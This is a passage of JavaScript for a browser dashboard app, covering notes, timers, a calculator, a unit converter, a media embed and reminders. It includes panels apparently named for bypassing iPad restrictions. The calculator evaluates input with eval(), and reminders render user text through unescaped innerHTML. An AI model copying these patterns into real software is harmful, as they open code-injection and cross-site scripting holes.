                  const blob = new Blob([textContent], { type: 'text/plain' });
                  const url = URL.createObjectURL(blob);
                  const a = document.createElement('a');
                  a.href = url;
                  a.download = `notes_text_${new Date().toISOString().split('T')[0]}.txt`;
                  document.body.appendChild(a);
                  a.click();
                  document.body.removeChild(a);
                  URL.revokeObjectURL(url);
                  showAlert('Text notes exported!', 'success');
                  activityLogger.log('Export Notes', { type: 'text' });
                  dashboard.updateStats('exportsMade');
              });

          }
      },

      initNotesPanel: function() {
          this.notes.init();
          // Restore canvas state from settings on initial load
          this.notes.redrawCanvas();
          this.updateUndoRedoButtons();
      },

      undoDraw: function() {
          if (this.notes.paths.length > 0) {
              const lastPath = this.notes.paths.pop();
              this.notes.redoStack.push(lastPath);
              this.notes.redrawCanvas();
              activityLogger.log('Undo Draw');
              this.updateUndoRedoButtons();
          } else {
            showAlert('Nothing to undo.', 'info', 1000);
          }
      },

      redoDraw: function() {
          if (this.notes.redoStack.length > 0) {
              const undonePath = this.notes.redoStack.pop();
              this.notes.paths.push(undonePath);
              this.notes.redrawCanvas();
              activityLogger.log('Redo Draw');
              this.updateUndoRedoButtons();
          } else {
            showAlert('Nothing to redo.', 'info', 1000);
          }
      },

      updateUndoRedoButtons: function() {
          document.getElementById('undoDrawBtn').disabled = this.notes.paths.length === 0;
          document.getElementById('redoDrawBtn').disabled = this.notes.redoStack.length === 0;
      },

      initRandomFactsQuotes: function() {
          const facts = [
            "A group of owls is called a parliament.",
            "Honey never spoils.",
            "The shortest war in history lasted only 38 to 45 minutes.",
            "Octopuses have three hearts.",
            "There are more possible iterations of a game of chess than there are atoms in the known universe."
          ];
          const quotes = [
            "The only way to do great work is to love what you do. – Steve Jobs",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "The future belongs to those who believe in the beauty of their dreams. – Eleanor Roosevelt",
            "It is during our darkest moments that we must focus to see the light. – Aristotle Onassis",
            "The best way to predict the future is to create it. – Abraham Lincoln"
          ];

          document.getElementById('factContent').textContent = facts[Math.floor(Math.random() * facts.length)];
          document.getElementById('quoteContent').textContent = quotes[Math.floor(Math.random() * quotes.length)];

          // Optional: automatically update every few minutes
          setInterval(() => {
              document.getElementById('factContent').textContent = facts[Math.floor(Math.random() * facts.length)];
              document.getElementById('quoteContent').textContent = quotes[Math.floor(Math.random() * quotes.length)];
          }, 300000); // Update every 5 minutes
      },

      // Initial panels state setup
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none'; // Default hidden state
          // Restore position/size if saved
          const state = this.panelsState[panel.id];
          if (state) {
              if (state.display === 'block') { // Only show if explicitly saved as open
                  panel.style.display = 'block';
              }
              if (state.position) {
                  panel.style.transform = `translate(${state.position.x}px, ${state.position.y}px)`;
                  panel.setAttribute('data-x', state.position.x);
                  panel.setAttribute('data-y', state.position.y);
              }
              if (state.size) {
                  panel.style.width = state.size.width;
                  panel.style.height = state.size.height;
              }
          }
        });
        document.querySelectorAll('.ipad-content, .bypass-content').forEach(content => {
          content.style.display = 'none';
        });

        // Ensure new random fact/quote panels are visible if no state
        const randomFactBox = document.getElementById('randomFactBox');
        const dailyQuoteBox = document.getElementById('dailyQuoteBox');
        if (!this.panelsState['randomFactBox']) randomFactBox.style.display = 'flex'; // Use flex for these box types
        if (!this.panelsState['dailyQuoteBox']) dailyQuoteBox.style.display = 'flex';

         // Reapply states after a brief delay to ensure styles are loaded
        setTimeout(() => {
          document.querySelectorAll('.box, .info-panel').forEach(panel => {
            const state = this.panelsState[panel.id];
            if (state) {
                if (state.display === 'block' && panel.id !== 'canvasContainer') { // canvasContainer is now part of notesPanel
                    panel.style.display = panel.classList.contains('box') ? 'flex' : 'block';
                }
                if (state.position) {
                    panel.style.transform = `translate(${state.position.x}px, ${state.position.y}px)`;
                    panel.setAttribute('data-x', state.position.x);
                    panel.setAttribute('data-y', state.position.y);
                }
                if (state.size) {
                    panel.style.width = state.size.width;
                    panel.style.height = state.size.height;
                }
            } else if (panel.id === 'randomFactBox' || panel.id === 'dailyQuoteBox') {
                 panel.style.display = 'flex'; // Default show these new boxes
            } else if (panel.id === 'notesPanel') { // Special handling for notesPanel with its canvas/textarea
                const notesPanelState = this.panelsState['notesPanel'];
                if (notesPanelState && notesPanelState.display === 'block') {
                    panel.style.display = 'block';
                    if (notesPanelState.mode === 'text') {
                        this.notes.textarea.style.display = 'block';
                        this.notes.canvas.style.display = 'none';
                        this.notes.textVisible = true;
                        document.getElementById('exportTextNotesBtn').style.display = 'block';
                    } else {
                        this.notes.textarea.style.display = 'none';
                        this.notes.canvas.style.display = 'block';
                        this.notes.textVisible = false;
                        document.getElementById('exportTextNotesBtn').style.display = 'none'; // Only visible in text mode
                    }
                }
            }
          });
        }, 100);
      },

      // Panel toggle functions
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        if (!panel) return;

        const currentDisplay = panel.style.display;
        panel.style.display = (currentDisplay === 'none' || currentDisplay === '') ? (panel.classList.contains('box') ? 'flex' : 'block') : 'none';

        if (panel.style.display !== 'none') {
            activityLogger.log('Panel Opened', { panelId: panelId });
            this.updateStats('panelsOpened');
            // If it's a content panel, restore its nested display
            if (panelId === 'ipadPanel') {
                const activeIpadContent = document.querySelector('#ipadPanel .ipad-content[style*="display: block"]');
                if (!activeIpadContent) document.getElementById('ipadRestrictions').style.display = 'block';
            }
            if (panelId === 'bypassPanel') {
                const activeBypassContent = document.querySelector('#bypassPanel .bypass-content[style*="display: block"]');
                if (!activeBypassContent) document.getElementById('bathroomBypass').style.display = 'block'; // Or whatever default
            }
            if (panelId === 'timerStopwatchPanel') {
              // Ensure one timer section is shown
              const activeTimerSection = document.querySelector('#timerStopwatchPanel div[id$="Content"][style*="display: block"]');
              if (!activeTimerSection) document.getElementById('timerContent').style.display = 'block';
            }
        } else {
            activityLogger.log('Panel Closed', { panelId: panelId });
            this.updateStats('panelsClosed');
        }
        // Save panel display state
        this.panelsState[panelId] = this.panelsState[panelId] || {};
        this.panelsState[panelId].display = panel.style.display;
        if (panelId === 'notesPanel') {
            this.panelsState[panelId].mode = this.notes.textVisible ? 'text' : 'draw';
        }
        localStorage.setItem('dashboardPanelsState', JSON.stringify(this.panelsState));
      },

      showIpadContent: function(contentId) {
        document.querySelectorAll('#ipadPanel .ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        activityLogger.log('iPad Content View', { contentId: contentId });
      },

      showBypassContent: function(contentId) {
        document.querySelectorAll('#bypassPanel .bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        activityLogger.log('Bypass Content View', { contentId: contentId });
      },

      updateWifiColors: function() {
          const wifiEntries = document.querySelectorAll('#wifiPanel .wifi-entry');
          wifiEntries.forEach(entry => {
              const levelDiv = entry.children[1]; // Second div is Wifi Level
              const level = levelDiv.textContent.trim().toLowerCase();
              levelDiv.classList.remove('high-signal', 'medium-signal', 'low-signal'); // Clear previous
              if (level === 'high') {
                  levelDiv.classList.add('high-signal');
              } else if (level === 'medium') {
                  levelDiv.classList.add('medium-signal');
              } else if (level === 'low') {
                  levelDiv.classList.add('low-signal');
              }
          });
      },

      initDraggableResizablePanels: function() {
        // target elements with the "box" and "info-panel" class
        interact('.box, .info-panel')
          .resizable({
            // resize from all edges and corners
            edges: { left: true, right: true, bottom: true, top: true },
            listeners: {
              move (event) {
                const target = event.target
                let x = (parseFloat(target.getAttribute('data-x')) || 0)
                let y = (parseFloat(target.getAttribute('data-y')) || 0)

                // update the element's style
                target.style.width = event.rect.width + 'px'
                target.style.height = event.rect.height + 'px'

                // translate when resizing from top or left edges
                x += event.deltaRect.left
                y += event.deltaRect.top

                target.style.transform = 'translate(' + x + 'px,' + y + 'px)'

                target.setAttribute('data-x', x)
                target.setAttribute('data-y', y)

                // For saving state later
                dashboard.savePanelState(target.id, 'size', {width: event.rect.width + 'px', height: event.rect.height + 'px'});
                dashboard.savePanelState(target.id, 'position', {x, y});
              },
            },
            modifiers: [
                // keep the edges inside the parent
                interact.modifiers.restrictEdges({
                    outer: 'parent'
                }),
                // minimum size
                interact.modifiers.restrictSize({
                    min: { width: 250, height: 100 }
                })
            ],
            inertia: true
          })
          .draggable({
            listeners: {
              start (event) {
                activityLogger.log('Panel Drag Start', { panelId: event.target.id });
                event.target.style.zIndex = '10'; // Bring to front when dragging
              },
              move (event) {
                const target = event.target
                const parentRect = target.parentNode.getBoundingClientRect();

                // Keep the D&D position relative to initial.
                // data-x and data-y store position relative to original document flow.
                let x = (parseFloat(target.getAttribute('data-x')) || 0) + event.dx;
                let y = (parseFloat(target.getAttribute('data-y')) || 0) + event.dy;

                // Restrict movement within parent boundaries (simplified, can be more complex for true multi-column layouts)
                const panelRect = target.getBoundingClientRect();
                const parentX1 = parentRect.left;
                const parentY1 = parentRect.top;
                const parentX2 = parentRect.right;
                const parentY2 = parentRect.bottom;

                // Adjust x/y to ensure the entire panel is within boundaries
                const limitedX = Math.max(parentX1, Math.min(parentX2 - panelRect.width, panelRect.left + x));
                const limitedY = Math.max(parentY1, Math.min(parentY2 - panelRect.height, panelRect.top + y));

                target.style.transform = `translate(${x}px, ${y}px)`; // Original unbounded for visuals

                // Set new data-x and data-y
                target.setAttribute('data-x', x);
                target.setAttribute('data-y', y);
              },
              end (event) {
                event.target.style.zIndex = ''; // Reset z-index
                activityLogger.log('Panel Drag End', { panelId: event.target.id });
                // Save position after dragging ends
                const x = parseFloat(event.target.getAttribute('data-x')) || 0;
                const y = parseFloat(event.target.getAttribute('data-y')) || 0;
                dashboard.savePanelState(event.target.id, 'position', {x, y});
              }
            },
            modifiers: [
                interact.modifiers.restrictRect({
                    // restrict to a given rectangle
                    restriction: 'parent',
                    endOnly: true
                })
            ],
            autoScroll: true
          });
      },
      // Helper to save individual panel state properties
      savePanelState: function(panelId, property, value) {
          this.panelsState[panelId] = this.panelsState[panelId] || {};
          this.panelsState[panelId][property] = value;
          localStorage.setItem('dashboardPanelsState', JSON.stringify(this.panelsState));
      },

      initSettingsPanel: function() {
        const settingsBtn = document.getElementById('settingsBtn');
        const settingsPanel = document.getElementById('settingsPanel');
        if (!settingsBtn || !settingsPanel) return;

        // Toggle panel logic is already in initPanelToggleButtons
        settingsBtn.addEventListener('click', () => {
          this.togglePanel('settingsPanel');
        });

        // Initialize setting elements (values already applied by dashboard.applySettings)
        const animationToggle = document.getElementById('animationToggle');
        if (animationToggle) {
          animationToggle.addEventListener('change', () => {
            const isDisabled = animationToggle.checked;
            this.settings.animations = !isDisabled;
            this.saveSettings();
            this.toggleAnimations(isDisabled); // Apply the CSS changes
            activityLogger.log('Setting Change: Animation Toggle', { enabled: !isDisabled });
            showAlert(`Animations are now ${isDisabled ? 'disabled' : 'enabled'}.`, 'info');
          });
        }

        const loggingLevelSelect = document.getElementById('loggingLevel');
        if (loggingLevelSelect) {
            loggingLevelSelect.addEventListener('change', (e) => {
                this.settings.loggingLevel = e.target.value;
                this.saveSettings();
                activityLogger.log('Setting Change: Logging Level', { level: e.target.value });
                showAlert(`Logging level set to ${e.target.value}.`, 'info');
            });
        }

        const dashboardLayoutSelect = document.getElementById('dashboardLayout');
        if (dashboardLayoutSelect) {
            dashboardLayoutSelect.addEventListener('change', (e) => {
                this.settings.dashboardLayout = e.target.value;
                this.saveSettings();
                this.setLayout(e.target.value);
                activityLogger.log('Setting Change: Dashboard Layout', { layout: e.target.value });
                showAlert(`Dashboard layout set to ${e.target.value}.`, 'info');
            });
        }

        const defaultPanelSelect = document.getElementById('defaultPanelOnStartup');
        if (defaultPanelSelect) {
            defaultPanelSelect.addEventListener('change', (e) => {
                this.settings.defaultPanelOnStartup = e.target.value;
                this.saveSettings();
                activityLogger.log('Setting Change: Default Panel on Startup', { panel: e.target.value });
                showAlert(`Default panel on startup set to ${e.target.value}.`, 'info');
            });
        }

        document.getElementById('resetLayoutBtn').addEventListener('click', () => {
          if (confirm('Are you sure you want to reset all panel positions and sizes to default?')) {
              localStorage.removeItem('dashboardPanelsState');
              this.panelsState = {}; // Clear current state
              showAlert('Layout reset! Refreshing page...', 'success', 2000);
              activityLogger.log('Layout Reset');
              setTimeout(() => window.location.reload(), 2000);
          }
        });

        document.getElementById('clearAllLogsBtn').addEventListener('click', () => {
            activityLogger.clearLogs();
            showAlert('Local activity logs have been cleared!', 'info');
        });

        const autoSaveNotes = document.getElementById('autoSaveNotes');
        if (autoSaveNotes) {
            autoSaveNotes.addEventListener('change', (e) => {
                this.settings.autoSaveNotes = e.target.checked;
                this.saveSettings();
                activityLogger.log('Setting Change: Auto-save Notes', { enabled: e.target.checked });
                showAlert(`Notes auto-save is now ${e.target.checked ? 'enabled' : 'disabled'}.`, 'info');
            });
        }

        const enableTooltips = document.getElementById('enableTooltips');
        if (enableTooltips) {
            enableTooltips.addEventListener('change', (e) => {
                this.settings.enableTooltips = e.target.checked;
                this.saveSettings();
                activityLogger.log('Setting Change: Enable Tooltips', { enabled: e.target.checked });
                showAlert(`Tooltips are now ${e.target.checked ? 'enabled' : 'disabled'}.`, 'info');
            });
        }

        const notificationVolume = document.getElementById('notificationVolume');
        if (notificationVolume) {
          notificationVolume.addEventListener('input', (e) => {
              this.settings.notificationVolume = parseInt(e.target.value);
              this.saveSettings();
              // Note: Audio functionality would need actual sound playback
              activityLogger.log('Setting Change: Notification Volume', { volume: e.target.value });
              showAlert(`Notification volume set to ${e.target.value} (alerts are visual only).`, 'info', 1500);
          });
        }

        const enableHighContrast = document.getElementById('enableHighContrast');
        if (enableHighContrast) {
          enableHighContrast.addEventListener('change', (e) => {
              this.settings.highContrast = e.target.checked;
              this.saveSettings();
              this.toggleHighContrast(e.target.checked);
              activityLogger.log('Setting Change: High Contrast Mode', { enabled: e.target.checked });
              showAlert(`High contrast mode is now ${e.target.checked ? 'enabled' : 'disabled'}.`, 'info');
          });
        }

        const languageSelect = document.getElementById('languageSelect');
        if (languageSelect) {
            languageSelect.addEventListener('change', (e) => {
                this.settings.language = e.target.value;
                this.saveSettings();
                activityLogger.log('Setting Change: Language', { lang: e.target.value });
                showAlert(`Language set to ${e.target.value}.`, 'info');
            });
        }

        const enableGestures = document.getElementById('enableGestures');
        if (enableGestures) {
            enableGestures.addEventListener('change', (e) => {
                this.settings.touchGestures = e.target.checked;
                this.saveSettings();
                activityLogger.log('Setting Change: Touch Gestures', { enabled: e.target.checked });
                showAlert(`Touch gestures are now ${e.target.checked ? 'enabled' : 'disabled'}.`, 'info');
            });
        }

        const dataSync = document.getElementById('dataSync');
        if (dataSync) {
            dataSync.addEventListener('change', (e) => {
                this.settings.cloudSync = e.target.checked;
                this.saveSettings();
                activityLogger.log('Setting Change: Cloud Sync', { enabled: e.target.checked });
                showAlert(`Cloud sync is now ${e.target.checked ? 'enabled' : 'disabled'} (feature not fully implemented).`, 'info');
            });
        }

        const autoUpdate = document.getElementById('autoUpdate');
        if (autoUpdate) {
            autoUpdate.addEventListener('change', (e) => {
                this.settings.autoUpdate = e.target.checked;
                this.saveSettings();
                activityLogger.log('Setting Change: Auto Update', { enabled: e.target.checked });
                showAlert(`Automatic updates are now ${e.target.checked ? 'enabled' : 'disabled'}.`, 'info');
            });
        }

        // Apply any saved settings
        this.applySettings();
      },

      // Timer / Stopwatch / Countdown functionality
      initTimerStopwatchPanel: function() {
        const timerContent = document.getElementById('timerContent');
        const stopwatchContent = document.getElementById('stopwatchContent');
        const countdownContent = document.getElementById('countdownContent');

        document.getElementById('showTimer').addEventListener('click', () => {
          timerContent.style.display = 'block';
          stopwatchContent.style.display = 'none';
          countdownContent.style.display = 'none';
          activityLogger.log('Timer/Stopwatch Toggle', { mode: 'timer' });
        });
        document.getElementById('showStopwatch').addEventListener('click', () => {
          timerContent.style.display = 'none';
          stopwatchContent.style.display = 'block';
          countdownContent.style.display = 'none';
          activityLogger.log('Timer/Stopwatch Toggle', { mode: 'stopwatch' });
        });
        document.getElementById('showCountdown').addEventListener('click', () => {
            timerContent.style.display = 'none';
            stopwatchContent.style.display = 'none';
            countdownContent.style.display = 'block';
            activityLogger.log('Timer/Stopwatch Toggle', { mode: 'countdown' });
        });

        // Initial state: show Timer
        document.getElementById('showTimer').click();

        // ---- Timer Logic ----
        let timerInterval;
        let timerSecondsLeft = 0;
        let timerRunning = false;
        const timerDisplay = document.getElementById('timerDisplay');
        const timerInput = document.getElementById('timerInput');

        document.getElementById('startTimer').addEventListener('click', () => {
          if (!timerRunning) {
            if (timerSecondsLeft === 0) { // If starting fresh
                const minutes = parseInt(timerInput.value) || 0;
                if (minutes <= 0) {
                    showAlert('Please enter a valid number of minutes (1-99) for the timer.', 'warning');
                    return;
                }
                timerSecondsLeft = minutes * 60;
            }
            timerRunning = true;
            timerInterval = setInterval(() => {
              timerSecondsLeft--;
              const minutes = String(Math.floor(timerSecondsLeft / 60)).padStart(2, '0');
              const seconds = String(timerSecondsLeft % 60).padStart(2, '0');
              timerDisplay.textContent = `${minutes}:${seconds}`;

              if (timerSecondsLeft <= 0) {
                clearInterval(timerInterval);
                timerRunning = false;
                showAlert('Timer finished!', 'info', 5000);
                timerDisplay.textContent = '00:00';
                activityLogger.log('Timer Finish');
              }
            }, 1000);
            activityLogger.log('Timer Start', { duration: timerSecondsLeft });
          }
        });

        document.getElementById('pauseTimer').addEventListener('click', () => {
          if (timerRunning) {
            clearInterval(timerInterval);
            timerRunning = false;
            showAlert('Timer paused.', 'info', 1500);
            activityLogger.log('Timer Pause');
          }
        });

        document.getElementById('resetTimer').addEventListener('click', () => {
          clearInterval(timerInterval);
          timerRunning = false;
          timerSecondsLeft = 0;
          timerDisplay.textContent = '00:00';
          timerInput.value = '';
          showAlert('Timer reset.', 'info', 1500);
          activityLogger.log('Timer Reset');
        });

        // ---- Stopwatch Logic ----
        let stopwatchInterval;
        let stopwatchSeconds = 0;
        let stopwatchRunning = false;
        const stopwatchDisplay = document.getElementById('stopwatchDisplay');
        const stopwatchLaps = document.getElementById('stopwatchLaps');
        let lapCounter = 0;

        document.getElementById('startStopwatch').addEventListener('click', () => {
          if (!stopwatchRunning) {
            stopwatchRunning = true;
            stopwatchInterval = setInterval(() => {
              stopwatchSeconds++;
              const hrs = String(Math.floor(stopwatchSeconds / 3600)).padStart(2, '0');
              const mins = String(Math.floor((stopwatchSeconds % 3600) / 60)).padStart(2, '0');
              const secs = String(stopwatchSeconds % 60).padStart(2, '0');
              stopwatchDisplay.textContent = `${hrs}:${mins}:${secs}`;
            }, 1000);
            activityLogger.log('Stopwatch Start');
          }
        });

        document.getElementById('pauseStopwatch').addEventListener('click', () => {
          if (stopwatchRunning) {
            clearInterval(stopwatchInterval);
            stopwatchRunning = false;
            showAlert('Stopwatch paused.', 'info', 1500);
            activityLogger.log('Stopwatch Pause');
          }
        });

        document.getElementById('resetStopwatch').addEventListener('click', () => {
          clearInterval(stopwatchInterval);
          stopwatchRunning = false;
          stopwatchSeconds = 0;
          lapCounter = 0;
          stopwatchDisplay.textContent = '00:00:00';
          stopwatchLaps.innerHTML = '';
          showAlert('Stopwatch reset.', 'info', 1500);
          activityLogger.log('Stopwatch Reset');
        });

        document.getElementById('lapStopwatch').addEventListener('click', () => {
          if (stopwatchRunning) {
            lapCounter++;
            const lapTime = stopwatchDisplay.textContent;
            const listItem = document.createElement('li');
            listItem.textContent = `Lap ${lapCounter}: ${lapTime}`;
            stopwatchLaps.appendChild(listItem);
            showAlert(`Lap ${lapCounter} recorded.`, 'info', 1000);
            activityLogger.log('Stopwatch Lap', { lap: lapCounter, time: lapTime });
          } else {
            showAlert('Stopwatch not running!', 'warning', 1000);
          }
        });

        // ---- Countdown Logic ----
        let countdownInterval;
        let countdownSeconds = 0;
        let countdownRunning = false;
        const countdownDisplay = document.getElementById('countdownDisplay');
        const countdownHoursInput = document.getElementById('countdownHours');
        const countdownMinutesInput = document.getElementById('countdownMinutes');
        const countdownSecondsInput = document.getElementById('countdownSeconds');

        document.getElementById('startCountdown').addEventListener('click', () => {
            if (!countdownRunning) {
                if (countdownSeconds === 0) { // If starting fresh
                    const hours = parseInt(countdownHoursInput.value) || 0;
                    const minutes = parseInt(countdownMinutesInput.value) || 0;
                    const seconds = parseInt(countdownSecondsInput.value) || 0;

                    countdownSeconds = (hours * 3600) + (minutes * 60) + seconds;
                }
                if (countdownSeconds <= 0) {
                    showAlert('Please enter a valid time for the countdown.', 'warning');
                    return;
                }

                countdownRunning = true;
                countdownInterval = setInterval(() => {
                    countdownSeconds--;
                    const hrs = String(Math.floor(countdownSeconds / 3600)).padStart(2, '0');
                    const mins = String(Math.floor((countdownSeconds % 3600) / 60)).padStart(2, '0');
                    const secs = String(countdownSeconds % 60).padStart(2, '0');
                    countdownDisplay.textContent = `${hrs}:${mins}:${secs}`;

                    if (countdownSeconds <= 0) {
                        clearInterval(countdownInterval);
                        countdownRunning = false;
                        showAlert('Countdown finished!', 'info', 5000);
                        countdownDisplay.textContent = '00:00:00';
                        activityLogger.log('Countdown Finish');
                    }
                }, 1000);
                activityLogger.log('Countdown Start', { duration: countdownSeconds });
            }
        });

        document.getElementById('pauseCountdown').addEventListener('click', () => {
            if (countdownRunning) {
                clearInterval(countdownInterval);
                countdownRunning = false;
                showAlert('Countdown paused.', 'info', 1500);
                activityLogger.log('Countdown Pause');
            }
        });

        document.getElementById('resetCountdown').addEventListener('click', () => {
            clearInterval(countdownInterval);
            countdownRunning = false;
            countdownSeconds = 0;
            countdownDisplay.textContent = '00:00:00';
            countdownHoursInput.value = '';
            countdownMinutesInput.value = '';
            countdownSecondsInput.value = '';
            showAlert('Countdown reset.', 'info', 1500);
            activityLogger.log('Countdown Reset');
        });
      }, // End initTimerStopwatchPanel

      initCalculator: function() {
        const calcDisplay = document.getElementById('calcDisplay');
        const buttons = document.querySelectorAll('#calculatorPanel .calc-btn');
        let currentInput = '';
        let result = '';
        let lastOperation = '';
        let newCalculation = false;

        const updateDisplay = (value) => {
            calcDisplay.value = value;
        };

        const calculate = () => {
            try {
                // Sanitize input (basic level)
                let expression = currentInput.replace(/×/g, '*').replace(/÷/g, '/');
                if (!expression) return '';

                // Evaluate the expression
                result = String(eval(expression)); // Using eval for simplicity, note security implications in real-world
                return result;
            } catch (error) {
                showAlert('Error in calculation!', 'error');
                return 'Error';
            }
        };

        buttons.forEach(button => {
            button.addEventListener('click', () => {
                const value = button.dataset.value;
                activityLogger.log('Calculator Button', { value: value });

                if (value === 'C') {
                    currentInput = '';
                    result = '';
                    lastOperation = '';
                    newCalculation = false;
                    updateDisplay('0');
                    return;
                }

                if (value === '=') {
                    if (currentInput === '') return;
                    result = calculate();
                    updateDisplay(result);
                    currentInput = result; // Allow further operations on result
                    newCalculation = true;
                    return;
                }

                if (newCalculation && !['+', '-', '*', '/', '%', '('].includes(value)) {
                    // If we had a result and pressed a number, start a new calculation
                    currentInput = value;
                    newCalculation = false;
                } else {
                    currentInput += value;
                    newCalculation = false;
                }

                updateDisplay(currentInput);
            });
        });
        updateDisplay('0'); // Initialize display
      }, // End initCalculator

      initUnitConverter: function() {
          const convertFromValueInput = document.getElementById('convertFromValue');
          const convertFromUnitSelect = document.getElementById('convertFromUnit');
          const convertToUnitSelect = document.getElementById('convertToUnit');
          const performConversionBtn = document.getElementById('performConversion');
          const conversionResultDiv = document.getElementById('conversionResult');

          const units = {
              length: {
                  meters: 1, feet: 3.28084, inches: 39.3701, cm: 100, km: 0.001, miles: 0.000621371
              },
              mass: {
                  kilograms: 1, pounds: 2.20462, grams: 1000, ounces: 35.274
              },
              temperature: { // Need special handling for temp
                  celsius: { toK: (c) => c + 273.15, fromK: (k) => k - 273.15 },
                  fahrenheit: { toK: (f) => (f - 32) * 5/9 + 273.15, fromK: (k) => (k - 273.15) * 9/5 + 32 },
                  kelvin: { toK: (k) => k, fromK: (k) => k }
              }
          };

          const populateToUnits = (fromUnit) => {
              convertToUnitSelect.innerHTML = '';
              const groupLabel = convertFromUnitSelect.querySelector(`option[value="${fromUnit}"]`).closest('optgroup').label.toLowerCase();

              for (const unitKey in units[groupLabel]) {
                  if (unitKey !== fromUnit) {
                      const option = document.createElement('option');
                      option.value = unitKey;
                      option.textContent = unitKey.charAt(0).toUpperCase() + unitKey.slice(1);
                      convertToUnitSelect.appendChild(option);
                  }
              }
              if (convertToUnitSelect.options.length > 0) {
                  convertToUnitSelect.selectedIndex = 0; // Select first available
              }
          };

          convertFromUnitSelect.addEventListener('change', () => {
              populateToUnits(convertFromUnitSelect.value);
              activityLogger.log('Unit Converter: From Unit Change', { unit: convertFromUnitSelect.value });
          });

          // Initial population
          populateToUnits(convertFromUnitSelect.value);

          performConversionBtn.addEventListener('click', () => {
              const value = parseFloat(convertFromValueInput.value);
              const fromUnit = convertFromUnitSelect.value;
              const toUnit = convertToUnitSelect.value;

              if (isNaN(value)) {
                  showAlert('Please enter a valid number to convert.', 'warning');
                  return;
              }
              if (!fromUnit || !toUnit) {
                  showAlert('Please select both "From" and "To" units.', 'warning');
                  return;
              }

              const groupLabel = convertFromUnitSelect.querySelector(`option[value="${fromUnit}"]`).closest('optgroup').label.toLowerCase();
              let resultValue;

              activityLogger.log('Unit Conversion Performed', { value, fromUnit, toUnit, category: groupLabel });

              if (groupLabel === 'temperature') {
                  const fromK = units.temperature[fromUnit].toK(value); // Convert initial value to Kelvin
                  resultValue = units.temperature[toUnit].fromK(fromK); // Convert from Kelvin to target unit
                  // Round temperatures for better readability
                  resultValue = Math.round(resultValue * 100) / 100;
              } else { // Length, Mass etc.
                  const toBase = value / units[groupLabel][fromUnit]; // Convert from `fromUnit` to base unit (e.g., meters or kg)
                  resultValue = toBase * units[groupLabel][toUnit]; // Convert from base unit to `toUnit`
                  // Round for better readability
                  resultValue = Math.round(resultValue * 100000) / 100000;
              }

              conversionResultDiv.textContent = `Result: ${resultValue} ${toUnit.charAt(0).toUpperCase() + toUnit.slice(1)}`;
              dashboard.updateStats('conversionsPerformed');
          });
      }, // End initUnitConverter

      initStatsTracker: function() {
        // Stats update logic already within dashboard.updateStats and activityLogger.log for various events
        // Display button
        document.getElementById('resetStatsBtn').addEventListener('click', () => this.resetStats());
        this.displayStats(); // Initial display
      },

      initMediaPlayer: function() {
          const youtubeLinkInput = document.getElementById('youtubeLinkInput');
          const loadYoutubeVideoBtn = document.getElementById('loadYoutubeVideo');
          const youtubePlayer = document.getElementById('youtubePlayer');
          const youtubePlayerContainer = document.getElementById('youtubePlayerContainer');

          loadYoutubeVideoBtn.addEventListener('click', () => {
              const url = youtubeLinkInput.value.trim();
              if (!url) {
                  showAlert('Please enter a YouTube URL.', 'warning');
                  return;
              }
              const videoId = this.extractYoutubeVideoId(url);
              if (videoId) {
                  const embedUrl = `https://www.youtube.com/embed/${videoId}`;
                  youtubePlayer.src = embedUrl;
                  youtubePlayer.style.display = 'block';
                  youtubePlayerContainer.querySelector('p').style.display = 'none'; // Hide disclaimer
                  showAlert('YouTube video loaded!', 'success');
                  activityLogger.log('Media Player: Load YouTube', { videoId: videoId });
              } else {
                  showAlert('Invalid YouTube URL. Please check the format.', 'error');
              }
          });
      },
      extractYoutubeVideoId: function(url) {
          const regex = /(?:https?:\/\/)?(?:www\.)?(?:m\.)?(?:youtube\.com|youtu\.be)\/(?:watch\?v=|embed\/|v\/|)([\w-]{11})(?:\S+)?/;
          const match = url.match(regex);
          return match ? match[1] : null;
      },

      initReminders: function() {
        const reminderTextInput = document.getElementById('reminderTextInput');
        const reminderDatetimeInput = document.getElementById('reminderDatetimeInput');
        const addReminderBtn = document.getElementById('addReminderBtn');
        const reminderList = document.getElementById('reminderList');

        let reminders = JSON.parse(localStorage.getItem('userReminders') || '[]');

        const renderReminders = () => {
            reminderList.innerHTML = '';
            reminders.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp)); // Sort by date

            if (reminders.length === 0) {
                reminderList.innerHTML = '<li>No reminders set.</li>';
                return;
            }

            reminders.forEach((reminder, index) => {
                const li = document.createElement('li');
                li.style.display = 'flex';
                li.style.justifyContent = 'space-between';
                li.style.alignItems = 'center';
                li.style.background = '#1c1c1c';
                li.style.padding = '8px';
                li.style.marginBottom = '5px';
                li.style.borderRadius = '5px';

                const reminderTime = new Date(reminder.timestamp).toLocaleString();
                li.innerHTML = `
                    <span><strong>${reminderTime}:</strong> ${reminder.text}</span>
                    <button data-index="${index}" style="background-color:#e74c3c; color:white; border:none; padding:5px 10px; border-radius:3px; cursor:pointer;">Done</button>
                `;
                reminderList.appendChild(li);
            });
            localStorage.setItem('userReminders', JSON.stringify(reminders));
        };

        const checkReminders = () => {
            const now = new Date().getTime();
            reminders.forEach(reminder => {
                const reminderTime = new Date(reminder.timestamp).getTime();
                if (!reminder.alerted && now >= reminderTime) {
                    showAlert(`🔔 Reminder: ${reminder.text}`, 'info', 7000);
                    reminder.alerted = true; // Mark as alerted
                    renderReminders(); // Re-render to show updated status or just persist change
                }
            });
            localStorage.setItem('userReminders', JSON.stringify(reminders));
        };

        addReminderBtn.addEventListener('click', () => {
            const text = reminderTextInput.value.trim();
            const datetime = reminderDatetimeInput.value;

            if (!text || !datetime) {
                showAlert('Please enter both reminder text and a date/time.', 'warning');
                return;
            }

            const reminderTime = new Date(datetime);
            if (reminderTime.getTime() < new Date().getTime()) {
                showAlert('Reminder time cannot be in the past!', 'error');
                return;
            }

            reminders.push({ text, timestamp: reminderTime.toISOString(), alerted: false });
            renderReminders();
            reminderTextInput.value = '';
            reminderDatetimeInput.value = '';
            showAlert('Reminder added!', 'success');
            activityLogger.log('Reminder Added', { text, timestamp: reminderTime.toISOString() });
        });

        reminderList.addEventListener('click', (e) => {
            if (e.target.tagName === 'BUTTON' && e.target.textContent === 'Done') {
